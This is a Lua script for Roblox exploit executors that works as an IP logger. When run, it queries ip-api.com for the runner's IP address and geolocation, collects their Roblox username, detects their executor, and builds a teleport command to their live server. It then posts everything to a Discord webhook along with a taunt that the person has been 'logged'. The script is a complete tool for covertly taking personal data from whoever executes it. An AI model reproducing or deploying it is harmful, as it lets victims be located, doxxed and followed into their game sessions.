local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo)
 
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"
 
local url =
   "Your webhook here"
local data = {
   ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL",
   ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["footer"] = {
             ["text"] = "" ..join_script.. ""
           }
       }
   }
}
 
 
local newdata = game:GetService("HttpService"):JSONEncode(data)
 
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
